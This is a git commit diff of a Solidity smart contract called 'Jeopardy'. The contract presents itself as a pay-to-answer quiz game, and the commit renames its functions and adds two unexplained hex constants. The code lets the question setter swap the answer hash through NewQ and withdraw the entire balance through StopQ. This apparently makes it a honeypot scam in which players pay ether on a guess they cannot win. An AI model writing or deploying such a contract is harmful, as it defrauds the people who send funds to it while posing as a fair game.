0aff3e936ffc00fa446b015c17ade6d7fd4211a1
Ngoc Bui Dinh <buidinhngoc.aiti@gmail.com>
2018-10-18 01:24:50 +0700

    add contract Jeopardy

--- Jeopardy.sol
+++ Jeopardy.sol
@@ -1,12 +1,12 @@
 /* 
- source code generate by Bui Dinh Ngoc aka ngocbd<buidinhngoc.aiti@gmail.com> for smartcontract Jeopardy at 0x064656852581472f9b315fea4730fe18fb7c579a
+ source code generate by Bui Dinh Ngoc aka ngocbd<buidinhngoc.aiti@gmail.com> for smartcontract Jeopardy at 0x590d1d5ba0feb249d42c527ae21d12f2e5768a87
 */
-pragma solidity ^0.4.24;
+pragma solidity ^0.4.23;
 
 contract Jeopardy
 {
     bytes32 responseHash;
-    string public Question;
+    string public QuizQuestion;
     address questionSender;
 
     function Try(string answer)
@@ -16,29 +16,31 @@ contract Jeopardy
         }
     }
  
-    function startGame(string question, string response)
+    function StartQ(string question, string response)
     public payable {
         if (responseHash == 0x0) {
             responseHash = keccak256(response);
-            Question = question;
+            QuizQuestion = question;
             questionSender = msg.sender;
         }
     }
 
-    function endGame()
+    function StopQ()
     public payable {
         if (msg.sender == questionSender) {
             msg.sender.transfer(address(this).balance);
         }
     }
 
-    function newGame(string question, bytes32 _responseHash)
+    function NewQ(string question, bytes32 _responseHash)
     public payable {
         if (msg.sender == questionSender) {
-            Question = question;
+            QuizQuestion = question;
             responseHash = _responseHash;
         }
     }
-    
-    function () payable public {}
+
+    function () public payable { }
+    uint256  versionMin = 0x006326e3367063c8166a8a6304858fef6363e3fbbd;
+    uint256  versionMaj = 0x00633e3ee859631f1c827f63f50ab247633fad9ae0;
 }
